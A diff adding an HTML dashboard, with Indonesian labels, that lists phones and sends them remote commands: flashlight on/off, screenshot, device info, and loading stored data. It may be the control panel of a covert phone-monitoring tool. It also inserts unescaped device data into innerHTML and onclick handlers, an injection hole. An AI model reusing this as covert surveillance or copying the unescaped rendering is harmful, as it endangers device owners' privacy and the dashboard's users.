@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Device Dashboard</title>
+  <style>
+    body { background: #111; color: #eee; font-family: Arial; padding: 20px; }
+    .device { border: 1px solid #333; padding: 10px; margin: 10px 0; border-radius: 5px; }
+    button { background: #0a84ff; color: white; border: none; padding: 8px 12px; margin: 4px; border-radius: 4px; cursor: pointer; }
+    pre { background: #222; padding: 10px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+  <h1>Device Dashboard</h1>
+  <div id="device-list"></div>
+  <div id="data-panel"></div>
+  <script>
+    async function loadDevices() {
+      const res = await fetch('/api/devices');
+      const { devices } = await res.json();
+      const list = document.getElementById('device-list');
+      list.innerHTML = '';
+      devices.forEach(d => {
+        const div = document.createElement('div');
+        div.className = 'device';
+        div.innerHTML = `
+          <strong>${d.device_id}</strong><br>
+          ${d.info ? JSON.stringify(d.info) : ''}
+          <br>
+          <button onclick="sendCommand('${d.device_id}','flashlight_on')">Senter ON</button>
+          <button onclick="sendCommand('${d.device_id}','flashlight_off')">Senter OFF</button>
+          <button onclick="sendCommand('${d.device_id}','screenshot')">Screenshot</button>
+          <button onclick="sendCommand('${d.device_id}','get_info')">Info HP</button>
+          <button onclick="loadData('${d.device_id}')">Muat Data</button>
+        `;
+        list.appendChild(div);
+      });
+    }
+
+    async function sendCommand(deviceId, command) {
+      await fetch('/api/command', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ device_id: deviceId, command })
+      });
+      alert('Command sent');
+    }
+
+    async function loadData(deviceId) {
+      const res = await fetch(`/api/data?device_id=${deviceId}`);
+      const { data } = await res.json();
+      document.getElementById('data-panel').innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
+    }
+
+    setInterval(loadDevices, 5000);
+    loadDevices();
+  </script>
+</body>
+</html>
